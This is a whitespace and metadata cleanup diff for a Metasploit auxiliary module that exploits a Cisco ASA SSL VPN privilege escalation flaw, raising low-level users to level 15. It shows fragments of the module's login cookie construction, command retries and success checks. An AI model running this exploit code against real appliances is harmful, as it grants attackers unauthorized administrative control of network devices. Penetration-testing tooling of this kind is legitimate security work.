@@ -6,8 +6,6 @@
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
-  Rank = ExcellentRanking
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -18,8 +16,8 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'        => 'Cisco ASA SSL VPN Privilege Escalation Vulnerability',
       'Description' => %q{
-        This module exploits a privilege escalation vulnerability for Cisco 
-        ASA SSL VPN (aka: WebVPN).  It allows level 0 users to escalate to 
+        This module exploits a privilege escalation vulnerability for Cisco
+        ASA SSL VPN (aka: WebVPN).  It allows level 0 users to escalate to
         level 15.
       },
       'Author'       =>
@@ -34,7 +32,7 @@ class Metasploit3 < Msf::Auxiliary
           [ 'URL', 'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa' ],
           [ 'URL', 'https://www3.trustwave.com/spiderlabs/advisories/TWSL2014-005.txt' ]
         ],
-      'DisclosureDate' => "April 9, 2014",
+      'DisclosureDate' => "Apr 9 2014",
 
     ))
 
@@ -126,7 +124,7 @@ class Metasploit3 < Msf::Auxiliary
          resp.body.include?('Cisco Adaptive Security Appliance Software Version')
         return resp.body
       else
-        vprint_error "#{peer} - Unable to run '#{command}'" 
+        vprint_error "#{peer} - Unable to run '#{command}'"
         print_good "#{peer} - Retrying #{i} '#{command}'" unless i == 2
       end
     end
@@ -146,7 +144,7 @@ class Metasploit3 < Msf::Auxiliary
       if resp &&
          !resp.body.include?('Command authorization failed') &&
          !resp.body.include?('Command failed')
-        print_good "#{peer} - Privilege Escalation Appeared Successful" 
+        print_good "#{peer} - Privilege Escalation Appeared Successful"
         return [username, password]
       else
         vprint_error "#{peer} - Unable to run '#{command}'"
@@ -171,10 +169,10 @@ class Metasploit3 < Msf::Auxiliary
 
   def do_login(user, pass, group)
     begin
-      cookie = "webvpn=; " + 
-               "webvpnc=; " + 
-               "webvpn_portal=; " + 
-               "webvpnSharePoint=; " + 
+      cookie = "webvpn=; " +
+               "webvpnc=; " +
+               "webvpn_portal=; " +
+               "webvpnSharePoint=; " +
                "webvpnlogin=1; " +
                "webvpnLang=en;"
 
@@ -218,9 +216,9 @@ class Metasploit3 < Msf::Auxiliary
     unless validate_cisco_ssl_vpn()
       vprint_error "#{peer} - Does not appear to be Cisco SSL VPN"
       :abort
-    end 
+    end
 
-    # This is crude, but I've found this to be somewhat 
+    # This is crude, but I've found this to be somewhat
     # interimittent based on session, so we'll just retry
     # 'X' times.
     datastore['RETRIES'].times do |i|
